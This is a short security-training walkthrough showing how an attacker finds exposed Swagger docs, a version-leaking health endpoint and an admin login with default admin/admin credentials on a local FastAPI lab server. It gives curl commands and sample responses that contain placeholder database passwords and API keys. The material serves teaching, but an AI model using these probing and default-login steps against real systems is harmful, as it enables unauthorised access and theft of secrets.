## Default Credentials & Unnecessary Features Enabled

### What is it?
Applications deployed to production with default credentials (admin/admin) and unnecessary features like Swagger documentation publicly exposed. Attackers scan for these using automated tools.

### Prerequisites
Start the vulnerable server:

```Bash
uvicorn vulnerable:app --reload
```

### Exploitation Steps

**1. Discover Exposed Documentation**

An attacker scans for common documentation endpoints:

```Bash
curl http://127.0.0.1:8000/docs
```

The Swagger UI is publicly accessible — revealing every endpoint, its parameters, and expected payloads. The attacker now has a full map of the API.

**2. Enumerate with the Health Endpoint**

```Bash
curl http://127.0.0.1:8000/health
```

Expected Response:
```JSON
{
  "status": "healthy",
  "version": "3.2.1-beta",
  "framework": "FastAPI 0.104.1",
  "database": "PostgreSQL 15.4",
  "cache": "Redis 7.2",
  "environment": "production"
}
```

The attacker now knows the exact software versions and can search for known CVEs.

**3. Try Default Credentials**

Using the endpoints discovered from Swagger, the attacker tries common default credentials:

```Bash
curl -u admin:admin http://127.0.0.1:8000/admin/dashboard
```

Expected Response:
```JSON
{
  "message": "Welcome to the Admin Dashboard",
  "db_connection": "postgres://prod_user:Pr0d_P@ss!@10.0.1.5:5432/maindb",
  "redis_url": "redis://10.0.1.10:6379",
  "api_keys": {"stripe": "sk_live_abc123...", "sendgrid": "SG.xyz789..."}
}
```

**Result:** A cascade of misconfigurations — exposed docs, verbose health endpoint, and default credentials — gives the attacker full access to database credentials, API keys, and internal infrastructure details.
